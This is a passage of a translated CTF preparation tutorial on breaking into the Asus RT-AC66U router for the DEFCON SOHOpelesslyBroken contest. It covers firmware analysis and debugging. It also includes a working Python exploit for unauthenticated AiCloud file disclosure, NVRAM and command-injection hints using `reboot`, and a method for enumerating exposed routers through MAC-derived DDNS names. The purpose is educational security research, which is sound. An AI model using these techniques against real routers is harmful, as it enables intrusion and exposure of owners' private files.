<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Break open Asus RT-AC66U and prepare for SOHOpelesslyBroken CTF</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Finally, July, the time has come to gather at DEFCON. Follow @defconparties on Twitter and determine which places to visit and which reports to go to....">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Break open Asus RT-AC66U and prepare for SOHOpelesslyBroken CTF</h1><div class="post__text post__text-html js-mediator-article">  Finally, July, the time has come to gather at DEFCON.  Follow <a href="https://twitter.com/defconparties">@defconparties</a> on Twitter and determine which <a href="http://defcne.net/villages/22">places</a> to visit and which <a href="https://www.defcon.org/html/defcon-22/dc-22-schedule.html">reports to</a> go to. <br><br>  This year there will be a new competition - <a href="http://sohopelesslybroken.com/">SOHOpelesslyBroken</a> , from ISE and EFF.  The goal of <a href="http://sohopelesslybroken.com/track0.php">Track 0</a> is to show previously unknown vulnerabilities in home wireless routers.  <a href="http://sohopelesslybroken.com/track1.php">Track 1</a> will be held in CTF mode right during DEFCON.  CTFs are always very funny, and specifically this one involves breaking into real iron, which is doubly fun! <br><br><img src="https://habrastorage.org/getpro/habr/post_images/63d/187/72e/63d18772e095c8dcad4f18e8c9bc4ed3.png" alt="image"><br>  <i>Yeah, this is my workplace = P</i> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      I am very interested in the <a href="https://openwireless.org/">EFF Open Wireless Router</a> (translator, by the way, too), but they still don‚Äôt tell anything about the device.  The <a href="http://sohopelesslybroken.com/track0.php">competition rules</a> include <a href="https://wikidevi.com/wiki/ASUS_RT-AC66U">ASUS RT-AC66U</a> (HW Ver. A2) [Version 3.0.0.4.266] as a possible hacking device.  I have an extra RT-AC66U at home, so I decided to write a small tutorial for all participants in <s>the</s> CTF <s>competition</s> <a name="habracut"></a><br><br><h5>  Intelligence service </h5><br>  First of all, you need to find the firmware and its source code.  Fortunately, Asus RT-AC66U is licensed under the GPL, and it is easy to find the source code of the firmware on the Internet.  The version used in the CTF is old, from 2012.  To analyze the firmware better, we will take the firmware and source code versions from v3.0.0.4.266 to v3.0.0.376.1123 (the latest version at the time of this writing): <br><br>  <a href="">Asus RT-AC66u v3.0.0.4.266 - firmware</a> <br>  <a href="">Asus RT-AC66u v3.0.0.4.266 - source code</a> <br>  <a href="">Asus RT-AC66u v3.0.0.4.376.1123 - firmware</a> <br>  <a href="">Asus RT-AC66u v3.0.0.4.376.1123 - source code</a> <br><br>  A number of firmware upgrades have been released between the two versions, so we‚Äôll see a history of their changes: <br>  <a href="http://www.asus.com/Networking/RTAC66U/HelpDesk_Download/">www.asus.com/Networking/RTAC66U/HelpDesk_Download</a> <br><img src="https://habrastorage.org/getpro/habr/post_images/b59/d50/a95/b59d50a95126659725c869616fdf5691.png" alt="image"><br><br>  According to the rules of the competition, we must detect and exploit a 0-day vulnerability.  You can connect several different vulnerabilities to score more points.  If the vendor patched a vulnerability without reporting it, and you were able to exploit it, then it will still be considered a 0-day vulnerability (let's not discuss the terminology). <br><br>  So, we have the source code, it's time to unpack and examine it.  <a href="https://trailofbits.github.io/ctf">The CTF Field Guide</a> from Trail of Bits contains good resources for <a href="https://trailofbits.github.io/ctf/vulnerabilities/source.html">source code auditing</a> .  You can use utilities like <a href="http://www.scootersoftware.com/">Beyond Compare</a> , <a href="http://www.araxis.com/merge/">Araxis Merge</a> and <a href="http://winmerge.org/">WinMerge</a> under Windows, or <a href="http://meldmerge.org/">Meld</a> if you are using Linux. <br>  We will work with the "/ asuswrt / release / src / router /" directory.  Compare the two versions via Meld: <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/429/18f/337/42918f337c307a8647f025bf259290ae.png" height="363" width="640"></a> <br><br>  This router already has many vulnerabilities found.  If you want to find a 0-day, you need to make sure that the vulnerability is not found before you (and believe me, this is the hardest part).  As an example: <br><ul><li>  <a href="http://infosec42.blogspot.com.br/2013/07/exploit-asus-rt-ac66u-remote-root.html">ASUS RT-AC66U Remote Root (Broadcom ACSD)</a> </li><li>  <a href="http://www.securityfocus.com/archive/1/526942">ASUS RT-N66U Router - HTTPS directory traversal disclosure</a> </li><li>  <a href="https://hatriot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection/">Asus RT56U Remote Command Injection</a> </li><li>  <a href="http://securityevaluators.com/knowledge/case_studies/routers/asus_rtn56u.php">Taking over the ASUS RT-N56U and RT-AC66U</a> </li><li>  <a href="http://arstechnica.com/security/2014/02/dear-asus-router-user-youve-been-pwned-thanks-to-easily-exploited-flaw/">Dear Asus router user: You've been pwned, thanks to easily exploited flaw (Asusgate)</a> </li><li>  <a href="http://osvdb.com/search%3Fsearch%255Bvuln_title%255D%3Dasus%26amp%3Bsearch%255Btext_type%255D%3Dalltext">OSVDB</a> </li></ul><br>  Some points will be taken from you if your exploits require special system configuration or special information.  So, if you want to score a lot of points, you should aim at the standard configuration of services and processes. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/5c5/22d/fde/5c522dfde0fcb2f6b6ea38fa6c4edd1f.png" height="330" width="400"></a> <br><br>  In the ‚ÄúUSB Applications‚Äù tab in RT-AC66U, you can configure some services, such as FTP, DLNA, NFS, and Samba. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/cd2/b3f/0e3/cd2b3f0e317a7ebf99c5269863e6fb1b.png" height="272" width="400"></a> <br><br>  MiniDLNA is also a great target.  It is easy to find vulnerabilities in it using <a href="https://twitter.com/zcutlip">Zachary Cutlip</a> 's <a href="http://shadow-file.blogspot.com.br/2014/05/infiltrate-2014.html">research</a> , because  he broke this program several times. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/217/2d3/f69/2172d3f69b906aeb8ea8f3def1debf6a.png" height="363" width="640"></a> <br><br>  Another potentially vulnerable service is AiCloud - it connects your home network to the online storage and gives access from a mobile device: <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/3c4/027/10a/3c402710ad893082c79cdbc8be222fb4.png" height="330" width="400"></a> <br><br><h5>  Forensic </h5><br>  While part of the command examines the source code, forensics specialists will unpack the firmware using binwalk and fmk: <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/ef7/a54/c3d/ef7a54c3d63c16a6e39b4583d11ca2c5.png" height="138" width="400"></a> <br><br>  You can remember <a href="https://github.com/bmaia/binwally">binwally</a> , a utility I wrote to <a href="http://w00tsec.blogspot.com/2013/12/binwally-directory-tree-diff-tool-using.html">find the difference between two binary trees using fuzzy hashing</a> .  Binwalk has its own option for fuzzy hashing between files and directories. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/3a5/78e/bbe/3a578ebbeb7cfe258eac69e461fd8e0d.png" height="250" width="400"></a> <br><br>  Most manufacturers (like Asus) do not open the entire code.  You will probably have to reverse the drivers and binaries to find a good vulnerability.  The binary named ‚ÄúACSD‚Äù is most interesting because it was removed from newer firmware versions (v3.0.0.4.374.130 +) due to a <a href="http://infosec42.blogspot.com/2013/07/exploit-asus-rt-ac66u-remote-root.html">vulnerability</a> found by <a href="https://twitter.com/rootHak42">Jacob Holcomb</a> . <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/a23/8cd/cb9/a238cdcb97dce13817ad5bd6044225f4.png" height="140" width="400"></a> <br><br>  Binary for MIPS Little Endian. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/028/b64/d60/028b64d609af70396314f3151e75ecea.png" height="232" width="400"></a> <br><br>  Also, it is important to find out more about the file system.  The OpenWRT Wiki has a great article <a href="http://wiki.openwrt.org/doc/techref/flash.layout">about flash markup</a> .  <a href="https://en.wikipedia.org/wiki/Memory_Technology_Device">MTD</a> in Linux gives access to flash devices and allows you to create full-fledged file systems on them.  You can go ssh to the device and see the markup: <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/2bf/697/9cd/2bf6979cdfefb64c5fbe0afee918c6d7.png" height="212" width="400"></a> <br><br>  The NVRAM section is very valuable to us, it stores all the device settings.  You can view its content just by scaling you need a partition (mtd1) or by running the <b>nvram show</b> command: <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/aa8/dfb/384/aa8dfb38482c8a2148e6b2c04c502f26.png" height="85" width="400"></a> <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/e84/7ab/b58/e847abb58b49a8f897cdb2e5ad320018.png" height="156" width="400"></a> <br><br>  Pmon is another interesting section.  It contains LZMA compressed data that the bootloader uses to restore the firmware when the update fails. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/7bb/e22/cbf/7bbe22cbf137d2d4ab9ac623e830b3bb.png" height="273" width="400"></a> <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/ddc/51f/391/ddc51f391d10eeeea9cc94c9d8c26d37.png" height="333" width="400"></a> <br><br><h5>  Breaking into </h5><br>  Time to start hacking something.  We need utilities like gdb, gdbserver and strace to start debugging binaries.  We can either cross-compile them, or configure Optware / Entware and install the assembled packages. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/e7e/59f/b0c/e7e59fb0c065b34e7d6cd035a575b955.png" height="220" width="400"></a> <br><br>  Wanduck (GPL_RT_AC66U_VER3004266 / asuswrt / release / src / router / rc / wanduck.c) is quite an interesting process to analyze.  It runs by default, and will raise the pseudo-HTTP server on port 18017. This HTTP server redirects every request to the main interface and, for some reason, drops all requests that end in ".ico". <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/7df/436/a5f/7df436a5f56d011beeb1c5fc96ba41e4.png" height="321" width="400"></a> <br><br>  Let's see why it does this ‚Äî run gdbserver remotely (gdbserver --multi localhost: 12345 &amp;) and connect with any debugger of your choice.  If you are using IDA Pro, open the binary and set the processor type to ‚Äúmipsrl‚Äù. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/550/f86/ef5/550f86ef58bf0a2bc3ac77371bcb62f6.png" height="95" width="400"></a> <br><br>  Find the function handle_http_req and set a breakpoint on the dst_url comparison: <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/e0b/99d/6d1/e0b99d6d1197edbefda922dd0419027f.png" height="435" width="640"></a> <br><br>  Enter the host and port gdbserver in the Debugger / Process Options menu and join the desired PID. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/432/6f5/2fc/4326f52fc051811f6db0f4bc4650b574.png" height="144" width="320"></a> <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/0ee/152/944/0ee152944d61546a02c7d23865b78020.png" height="94" width="320"></a> <br><br>  Continue the process (F9) and execute the HTTP request at <a href="">192.168.1.1/x.ico</a> .  The debugger stops at a given breakpoint and you can see the registers and memory. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/9c9/aee/dd3/9c9aeedd3a31b362fdf3ef28be5554ef.png" height="320" width="640"></a> <br><br>  If you want to find other targets for research, search for them in the ‚Äúprebuilt‚Äù directory inside ‚ÄúGPL_RT_AC66U_VER3004266 / asuswrt / release / src / router /‚Äù.  Some interesting binaries: <br><ul><li>  / acsd / prebuilt / acsd </li><li>  / webdav_client / prebuilt / webdav_client </li><li>  / asuswebstorage / prebuilt / asuswebstorage </li><li>  / eapd / linux / prebuilt / eapd </li><li>  / nas / nas / prebuilt / nas </li><li>  / flash / prebuilt / flash </li><li>  / et / prebuilt / et </li><li>  / wps / prebuilt / wps_monitor </li><li>  / ated / prebuilt / ated </li><li>  / wlconf / prebuilt / wlconf </li></ul><br>  Mobile application AiCloud can reveal more interesting information about the operation of the device.  If you disable the APK, or use the intercept proxy, you can get the initial HTTP request for the application: <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/d58/bb5/a68/d58bb5a6855a127de7636599695599e1.png" height="320" width="192"></a> <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/5b0/be9/006/5b0be90062b05e237f68df29f94b2cad.png" height="320" width="192"></a> <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/606/320/ca6/606320ca666bbc802781b3cc9fe79312.png" height="240" width="640"></a> <br><br>  Notice the strange parameter ddns_hostname?  Problem on cryptography =) (the translator does not think so). <br><br><h5>  Cryptography </h5><br>  A POST request tries to register a new Dynamic DNS address to the device using the asuscomm.com service.  If we look for this line in the source code of RT-AC66U, then we can easily find a function that generates the DDNS address: <br><br><pre><code class="hljs javascript"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> isMD5DDNSName = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> macAddr = <span class="hljs-string"><span class="hljs-string">'&lt;% nvram_get("lan_hwaddr"); %&gt;'</span></span>.toUpperCase().replace(<span class="hljs-regexp"><span class="hljs-regexp">/:/g</span></span>, <span class="hljs-string"><span class="hljs-string">""</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"A"</span></span>+hexMD5(macAddr).toUpperCase()+<span class="hljs-string"><span class="hljs-string">".asuscomm.com"</span></span>; }</code> </pre> <br><br>  According to information from <a href="https://wikidevi.com/wiki/ASUS_RT-AC66U">WikiDev</a> , RT-AC66U uses the following organization identifiers in MAC addresses: <br><ul><li>  08: 60: 6E (1 E, 1 W, 2011) </li><li>  10: BF: 48 (1 E, 2 W, 2011) </li><li>  30: 85: A9 (3 E, 3 W, 2011) </li><li>  50: 46: 5D (1 E, 2 W, 2012) </li></ul><br><br>  Using this information, we can match the IP address of each router using AiCloud.  Just generate a list of all possible MAC addresses and sort out the DNS names with a <a href="https://twitter.com/mubix">mubix</a> <a href="http://www.room362.com/blog/2014/01/29/hostname-bruteforcing-on-the-cheap/">trick</a> <a href="https://twitter.com/mubix">.</a> <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/739/0db/108/7390db1088a764a48043bdee7db663b5.png" height="262" width="400"></a> <br><br>  If you are too lazy to run a command, you can search ‚Äúasuscomm.com‚Äù on <a href="http://www.shodanhq.com/">Shodan</a> . <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/03c/208/94b/03c20894b9d257778b713d71ccd81e86.png" height="256" width="400"></a> <br><br>  AiCloud works by default on ports 8082 and 443. The fact that anyone can easily get a list of routers that have this service running should be a concern, <a href="http://www.securityfocus.com/archive/1/526942">right?</a> <br><br>  Another interesting cryptographic warm-up can be a parsing algorithm for generating a WPS PIN device.  You can get the current PIN and secret_code by running the nvram show |  grep -E secret_code | wps_device_pin ". Look for these values ‚Äã‚Äãin the source code and use the resulting information to write keygens (and do not forget to add chiptune from <a href="http://pouet.net/">pouet.net</a> ). <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/7df/42d/df6/7df42ddf648147f8312523df95ec89b9.png" height="153" width="400"></a> <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/e58/485/eb4/e58485eb4a8561c5052f2dee0267d847.png" height="276" width="640"></a> <br><br>  You can also check the entropy of the keys generated on the device.  Look at the <a href="http://events.ccc.de/congress/2013/Fahrplan/system/attachments/2226/original/Scanning-30c3-13.pdf">‚ÄúFast Internet-wide Scanning and its Security Applications‚Äù</a> slides for a couple of ideas. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/2ce/ff7/0b8/2ceff70b8eaec7af2ac41ceb93340af2.png" height="271" width="400"></a> <br><br><h5>  Web </h5><br>  There are so many techniques for testing web penetrations that I will focus only on a couple of them.  The router interface has no protection against CSRF.  There is also a traditional inject in the ping team and a bunch of XSS vectors. <br><br>  HTTP daemon based on microhttpd.  There is a basic protection against leaving the directory in httpd.c: <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/d8f/541/c76/d8f541c768474a958f4cd0d622a8ff0d.png" height="139" width="640"></a> <br><br>  We can shamelessly sneak in on the <a href="http://www.exploit-db.com/download_pdf/18094/">idea of</a> <a href="https://twitter.com/hackerfantastic">hackerfantastic</a> and test potential protection <a href="https://twitter.com/hackerfantastic">bypass</a> : <br><pre> <code class="hljs mel">#include &lt;stdio.h&gt; #include &lt;<span class="hljs-keyword"><span class="hljs-keyword">string</span></span>.h&gt; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> main(<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> argc, char *argv[]){ char *<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> len; <span class="hljs-keyword"><span class="hljs-keyword">file</span></span> = argv[<span class="hljs-number"><span class="hljs-number">1</span></span>]; len = strlen(<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ( <span class="hljs-keyword"><span class="hljs-keyword">file</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-string"><span class="hljs-string">'/'</span></span> || <span class="hljs-keyword"><span class="hljs-keyword">strcmp</span></span>( <span class="hljs-keyword"><span class="hljs-keyword">file</span></span>, <span class="hljs-string"><span class="hljs-string">".."</span></span> ) == <span class="hljs-number"><span class="hljs-number">0</span></span> || strncmp( <span class="hljs-keyword"><span class="hljs-keyword">file</span></span>, <span class="hljs-string"><span class="hljs-string">"../"</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span> ) == <span class="hljs-number"><span class="hljs-number">0</span></span> || strstr( <span class="hljs-keyword"><span class="hljs-keyword">file</span></span>, <span class="hljs-string"><span class="hljs-string">"/../"</span></span> ) != (char*) <span class="hljs-number"><span class="hljs-number">0</span></span> || <span class="hljs-keyword"><span class="hljs-keyword">strcmp</span></span>( &amp;(<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>[len<span class="hljs-number"><span class="hljs-number">-3</span></span>]), <span class="hljs-string"><span class="hljs-string">"/.."</span></span> ) == <span class="hljs-number"><span class="hljs-number">0</span></span> ) { printf (<span class="hljs-string"><span class="hljs-string">"Illegal filename: %s\n"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">file</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { printf (<span class="hljs-string"><span class="hljs-string">"Accepted filename: %s\n"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">file</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/a42/43c/f30/a4243cf3091c85f7ae09124472ffcef6.png" height="261" width="400"></a> <br><br>  There are some MIME handlers in the web server that ‚Äúshould have been removed‚Äù <br><pre> <code class="hljs pgsql">// <span class="hljs-keyword"><span class="hljs-keyword">some</span></span> should be removed struct except_mime_handler except_mime_handlers[] = { { "QIS_*", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "qis/*", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "*.css", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "state.js", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "detect.js", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "popup.js", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "general.js", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "help.js", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "start_autodet.asp", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "start_apply.htm", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "start_apply2.htm", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "setting_lan.htm", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "httpd_check.htm", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "status.asp", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "automac.asp", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "detecWAN.asp", MIME_EXCEPTION_NORESETTIME}, { "detecWAN2.asp", MIME_EXCEPTION_NORESETTIME}, { "WPS_info.asp", MIME_EXCEPTION_NORESETTIME}, { "WAN_info.asp", MIME_EXCEPTION_NOAUTH_ALL|MIME_EXCEPTION_NORESETTIME}, { "result_of_get_changed_status.asp", MIME_EXCEPTION_NORESETTIME}, { "result_of_get_changed_status_QIS.asp", MIME_EXCEPTION_NOAUTH_FIRST|MIME_EXCEPTION_NORESETTIME}, { "result_of_detect_client.asp", MIME_EXCEPTION_NORESETTIME}, { "Nologin.asp", MIME_EXCEPTION_NOAUTH_ALL}, { "alertImg.gif", MIME_EXCEPTION_NOAUTH_ALL}, { "error_page.htm", MIME_EXCEPTION_NOAUTH_ALL}, { "jquery.js", MIME_EXCEPTION_NOAUTH_ALL}, { "gotoHomePage.htm", MIME_EXCEPTION_NOAUTH_ALL}, { "update_appstate.asp", MIME_EXCEPTION_NOAUTH_ALL}, { "update_cloudstatus.asp", MIME_EXCEPTION_NOAUTH_ALL}, { "get_webdavInfo.asp", MIME_EXCEPTION_NOAUTH_ALL}, { "*.gz", MIME_EXCEPTION_NOAUTH_ALL}, { "*.tgz", MIME_EXCEPTION_NOAUTH_ALL}, { "*.zip", MIME_EXCEPTION_NOAUTH_ALL}, { "*.ipk", MIME_EXCEPTION_NOAUTH_ALL}, { <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span> } };</code> </pre> <br><br>  The file get_webdavInfo.asp is accessible without authentication and displays a large amount of important information about the device and network: <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/a12/4ee/c7d/a124eec7d5ad6c4e30ce8102185ff9aa.png" height="116" width="400"></a> <br><br>  We can change the values ‚Äã‚Äãof variables in nvram to install the XSS backdoor on this page, for example: <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/805/30f/40c/80530f40c65bedadfcfcb925de42f9cf.png" height="231" width="400"></a> <br><br>  Some operations use the nvram_get and nvram_safe_get functions.  Settings, it happens, are saved through the function nvram_set.  If the router does not screen the data that it receives from NVRAM, then you can do something like NVRAM injection (% 0A,% 0D and `reboot` will always be your helpers in this matter). <br><br>  AiCloud is a <b>very</b> vulnerable service that can be <a href="http://www.securityfocus.com/archive/1/526942">easily operated</a> .  As soon as you activate it in the settings, lighttpd is launched on the router on port 8082 (or 443 on new firmware versions) and offers to give access to your files online.  The joke is that the login and password input dialog can be bypassed by adding / smb / to the URL (read the source!) <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/37d/79a/045/37d79a045c3e4cf67a0dbc518d81bbc9.png" height="300" width="320"></a> <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/a5f/0ab/4b6/a5f0ab4b6b7de4a058095ff37f43bea1.png" height="295" width="400"></a> <br><br>  I wrote a small script for using this bug in AiCloud on RT-AC66U v3.0.0.4.266.  It receives all files and paths on the router, including from USB devices. <br><br><pre> <code class="hljs pgsql">#!/usr/bin/python <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> bs4 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> BeautifulSoup <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urllib2 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys def list_dir(url, start_dir): try: html_page = urllib2.urlopen(url+start_dir) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span> urllib2.HTTPError <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> e: print e sys.<span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>) soup = BeautifulSoup(html_page) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> link <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> soup.findAll(<span class="hljs-string"><span class="hljs-string">'a'</span></span>): <span class="hljs-type"><span class="hljs-type">path</span></span> = link.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(<span class="hljs-string"><span class="hljs-string">'uhref'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-type"><span class="hljs-type">path</span></span> != <span class="hljs-string"><span class="hljs-string">'../'</span></span>: is_dir = link.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(<span class="hljs-string"><span class="hljs-string">'isdir'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> is_dir == str(<span class="hljs-string"><span class="hljs-string">'1'</span></span>): print url+<span class="hljs-type"><span class="hljs-type">path</span></span> list_dir(url,<span class="hljs-type"><span class="hljs-type">path</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: print url+<span class="hljs-type"><span class="hljs-type">path</span></span> nargs = len(sys.argv) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> nargs == <span class="hljs-number"><span class="hljs-number">2</span></span>: url = sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>] start_dir = "/smb" elif nargs == <span class="hljs-number"><span class="hljs-number">3</span></span>: url = sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>] start_dir = str(sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>]) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: print <span class="hljs-string"><span class="hljs-string">'Asus RT-AC66U AiCloud Unauthenticated File Disclosure\ \nTested Firmwares: 3.0.0.4.266, 3.0.0.4.270 and 3.0.0.4.354\ \nDisclosed by Kyle Lovett\ \nScript by Bernardo Rodrigues - http://w00tsec.blogspot.com\ \nUsage: python %s http://url [path]'</span></span> % sys.argv[<span class="hljs-number"><span class="hljs-number">0</span></span>] sys.<span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>) list_dir(url, start_dir)</code> </pre><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/8d2/592/288/8d2592288250ceaff2a47b758ec9dc4b.png" height="262" width="400"></a> <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/397/335/2e7/3973352e7b275a637c4e7d6f73313b32.png" height="97" width="400"></a> <br><br>  And finally, do not forget to compare the difference in the files in the directory www.  Along this path are all the components and scripts that are used in the web interface. <br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/06e/38e/55b/06e38e55bc651787474eb08d66839398.png" height="227" width="400"></a> <br><br><h5>  Bonus </h5><br>  Why not try to open the lid of the router without damaging the warranty seal?  For this, you will need advice from the guys from <a href="http://defcne.net/villages/22/17">DEFCON Tamber Evident Village</a> . <br><br> <a href=""><img src="https://habrastorage.org/getpro/habr/post_images/61f/925/544/61f9255440160905553f1f9bee6c4d02.png" height="400" width="348"></a> <br><br><h5>  Other (sort of conclusion) </h5><br>  Hacking Asus RT-AC66U is a great exercise for newbies in hacking routers.  Most of the source code is freely available, and you can find a bunch of exploits and vulnerability descriptions for it.  You might not have noticed, but we tested every item from the <a href="https://www.owasp.org/index.php/OWASP_Internet_of_Things_Top_Ten_Project">OWASP Internet of Things Top 10</a> .  Rumor has it that this router will be part of the basic part of the OWASP IoT Webgoat and Damn Vulnerable Embedded Linux. <br><br>  Here are a couple of approaches that can give you extra points in the competition: <br><ul><li>  Overwriting bootloader code and creating dual-boot with backdoor </li><li>  